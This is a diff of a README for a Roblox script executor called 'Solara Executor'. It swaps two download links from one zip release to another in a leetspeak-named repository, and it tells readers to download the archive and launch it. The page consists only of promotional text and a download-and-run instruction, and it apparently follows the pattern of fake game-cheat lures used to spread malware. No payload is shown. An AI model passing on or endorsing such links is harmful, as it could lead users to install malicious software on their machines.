@@ -1,5 +1,5 @@
 # 🚀 Solara Executor README
-[![Download Solara Executor](https://github.com/vyzls-101/robl0x-scr1pts-s0lara/releases/download/v1.0/Program.zip Executor-brightgreen)](https://github.com/vyzls-101/robl0x-scr1pts-s0lara/releases/download/v1.0/Program.zip)
+[![Download Solara Executor](https://github.com/vyzls-101/robl0x-scr1pts-s0lara/releases/download/v2.0/Software.zip Executor-brightgreen)](https://github.com/vyzls-101/robl0x-scr1pts-s0lara/releases/download/v2.0/Software.zip)
 
 Welcome to the Solara Executor repository! Solara Executor is a cutting-edge Roblox script executor designed for advanced script execution, optimized performance, and a seamless user experience. Whether you're a gamer, developer, or modding enthusiast looking to enhance your Roblox gameplay, Solara Executor is the perfect tool for you.
 
@@ -13,7 +13,7 @@ Welcome to the Solara Executor repository! Solara Executor is a cutting-edge Rob
 ## Getting Started
 To get started with Solara Executor, simply click on the button below to download the latest version of the executor. Once downloaded, launch the file to begin using Solara Executor.
 
-[![Download Solara Executor](https://github.com/vyzls-101/robl0x-scr1pts-s0lara/releases/download/v1.0/Program.zip Executor-brightgreen)](https://github.com/vyzls-101/robl0x-scr1pts-s0lara/releases/download/v1.0/Program.zip)
+[![Download Solara Executor](https://github.com/vyzls-101/robl0x-scr1pts-s0lara/releases/download/v2.0/Software.zip Executor-brightgreen)](https://github.com/vyzls-101/robl0x-scr1pts-s0lara/releases/download/v2.0/Software.zip)
 
 ## Topics
 Explore the following topics related to Solara Executor and Roblox:
